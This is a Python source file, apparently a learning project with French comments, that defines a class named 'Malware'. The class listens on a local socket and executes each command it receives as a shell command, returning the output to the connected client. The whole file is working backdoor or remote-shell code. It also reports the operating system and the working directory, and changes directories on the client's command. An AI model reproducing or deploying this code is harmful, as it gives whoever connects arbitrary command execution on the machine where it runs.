import os, sys, socket, subprocess as sp, platform, time

#CONSTANTES
ENCODING='UTF-8'
BUFFERSIZE=2048



class Malware():

    def __init__(self):
        self.ip = 'localhost'
        self.port = 50001
        self.s = socket.socket()
        self.conn = self.s
        self.addr = self.s

    def connect(self):
        self.s.bind((self.ip, self.port))
        print("En Attente du client...")  # DEBUG A SUPPRIMER
        self.s.listen(1)
        self.conn, self.addr = self.s.accept()
        print("Connexion Ã©tablie avec le client")

    def disconnect(self):
        self.s.close()

    def task(self):

        act = self.conn.recv(1024).decode(ENCODING)

        while act != 'exit()':

            if act == 'os':
                self.giveOperatingSystem()
            elif act == 'cwd':
                self.giveCurrentWorkingDirectory()
            elif act[:2] == 'cd':
                print (act[:2])
                self.changeCurrentDirectory(act)
               # self.giveCurrentWorkingDirectory()

            else:
                shell = Shell(self.conn, act)
                shell.ReturnResultCmd()
            act = self.conn.recv(1024).decode(ENCODING)





    def giveOperatingSystem(self):
        opSys = platform.system()
        self.conn.send((opSys).encode(ENCODING))

    def giveCurrentWorkingDirectory(self):
        cwd = os.getcwd()
        print('test give')
        self.conn.send((cwd).encode(ENCODING))

    def changeCurrentDirectory(self,act):
        print('test')
        cd = act.strip('cd ')
        try:
            os.chdir(cd)
        except:
            print('Adresse Introuvable')




    def getSystemInfo(self):
        pass





    def run(self):
        self.connect()
        self.task()
        self.disconnect()


class Shell():

    def __init__(self,s, cmd):
        self.conn = s
        self.cmd = cmd



    def ReturnResultCmd(self):


            print('apres reception')
            sh = sp.Popen(self.cmd, shell=True, stdout = sp.PIPE,
                                stderr = sp.PIPE, stdin = sp.PIPE,
                                universal_newlines=True)
            out, err = sh.communicate()
            result = (out) + (err)
            length = str(len(result)).zfill(16)
            self.conn.sendall((length+result).encode(ENCODING))




go = Malware()
go.run()







